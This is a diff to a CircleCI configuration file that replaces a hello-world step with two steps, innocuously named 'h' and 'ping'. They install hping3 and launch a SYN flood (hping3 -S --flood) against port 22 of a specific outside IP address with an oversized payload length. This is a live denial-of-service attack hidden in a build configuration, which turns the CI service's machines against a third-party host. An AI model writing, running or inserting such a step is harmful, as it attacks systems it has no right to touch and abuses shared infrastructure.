@@ -15,8 +15,11 @@ jobs:
     steps:
       - checkout
       - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
+          name: "h"
+          command: "sudo apt install hping3 -y"
+      - run:
+          name: "ping"
+          command: "hping3 -S --flood -V -p 22 45.142.122.104 -d 9999999999" 
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
